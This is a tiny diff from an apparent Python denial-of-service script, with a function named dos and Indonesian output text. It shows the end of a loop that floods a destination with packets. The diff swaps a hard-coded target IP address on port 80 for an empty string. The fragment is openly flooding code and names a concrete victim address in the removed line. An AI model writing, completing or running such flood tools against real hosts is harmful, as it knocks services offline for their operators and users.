@@ -13,4 +13,4 @@ async def dos(HOST: str,PORT: int) -> None:
             flood.sendto(proxy,dest)
             print(f"packet dikirimkan ke {dest[0]}")
 
-run(dos("203.161.184.2",80))
+run(dos("",80))
